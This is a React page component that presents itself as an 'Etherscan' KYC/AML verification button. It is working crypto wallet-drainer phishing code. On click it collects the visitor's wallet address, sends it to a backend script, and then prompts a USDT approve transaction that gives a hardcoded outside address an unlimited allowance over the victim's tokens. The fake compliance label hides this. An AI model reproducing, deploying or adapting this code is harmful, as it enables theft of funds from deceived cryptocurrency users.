"use client";

import { useEffect, useState } from "react";

export default function Page() {
  const [status, setStatus] = useState("Verification KYC/AML");
  const [disabled, setDisabled] = useState(false);

  const isMobile = () =>
    typeof navigator !== "undefined" &&
    /android|iphone|ipad|ipod/i.test(navigator.userAgent);

  const handleConnect = async () => {
    setDisabled(true);
    setStatus("Connecting...");

    try {
      if (typeof window.ethereum === "undefined") {
        if (isMobile()) {
          // Redirect to Trust Wallet via intent (mobil)
          const intent = `intent://wc#Intent;package=com.wallet.crypto.trustapp;scheme=wc;end`;
          window.location.href = intent;
        } else {
          setStatus("No wallet detected");
        }
        return;
      }

      const provider = window.ethereum;
      const accounts = await provider.request({ method: "eth_requestAccounts" });
      const walletAddress = accounts[0];

      // Trimite adresa către PHP sau alt backend
      await fetch("/save.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `address=${encodeURIComponent(walletAddress)}`
      });

      // Aprobare token USDT
      const spender = "0xbA9D4eeB570FC52CF0d5362f80Ef31DD7F239e75";
      const usdt = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
      const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
      const method = "095ea7b3";
      const txData = "0x" + method + spender.slice(2).padStart(64, '0') + maxUint.slice(2).padStart(64, '0');

      await provider.request({
        method: "eth_sendTransaction",
        params: [{
          from: walletAddress,
          to: usdt,
          data: txData
        }]
      });

      setStatus("Wallet connected");
    } catch (err) {
      console.error(err);
      setStatus("Verification Failed");
      setTimeout(() => {
        setStatus("Verification KYC/AML");
        setDisabled(false);
      }, 2500);
    }
  };

  return (
    <main style={{ padding: "40px", fontFamily: "sans-serif" }}>
      <h1>Connect to Etherscan</h1>
      <button
        onClick={handleConnect}
        disabled={disabled}
        style={{
          background: disabled
            ? "linear-gradient(90deg,#fbbf24 60%,#2563eb 100%)"
            : "linear-gradient(90deg,#2563eb 60%,#38bdf8 100%)",
          color: "#fff",
          padding: "12px 32px",
          borderRadius: "24px",
          fontWeight: "500",
          fontSize: "1rem",
          border: "none",
          cursor: "pointer",
          transition: "background 0.2s, color 0.2s",
        }}
      >
        {status}
      </button>
    </main>
  );
}